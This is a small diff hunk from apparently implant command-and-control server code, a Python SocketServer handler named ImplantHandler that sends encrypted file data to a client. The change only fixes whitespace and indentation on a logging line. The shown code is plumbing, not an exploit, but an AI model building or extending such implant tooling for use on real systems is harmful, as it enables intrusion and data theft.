@@ -77,8 +77,8 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                                 self.request.sendall(self.cipher.encode(EOF_STR))
                                 break
                             else:
-                                self.request.sendall(self.cipher.encode(data)) 
-                    self.logger.debug("sent file")
+                                self.request.sendall(self.cipher.encode(data))
+                        self.logger.debug("sent file")
                 elif cmd == "exit":
                     break
                 else:
